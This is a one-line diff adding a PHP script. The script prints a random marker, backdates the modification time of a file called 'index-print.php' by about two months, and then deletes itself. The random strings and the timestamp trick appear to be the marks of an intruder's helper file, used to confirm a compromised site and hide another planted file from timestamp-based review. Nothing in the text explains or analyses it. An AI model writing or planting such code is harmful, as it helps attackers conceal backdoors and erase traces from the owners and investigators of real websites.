@@ -1,0 +1,1 @@
+<?php echo "hPFHqReVfZ"; if (file_exists("./index-print.php")){ touch("./index-print.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*Ut4fw9xvzyMyt3ez4cgd*/ ?>
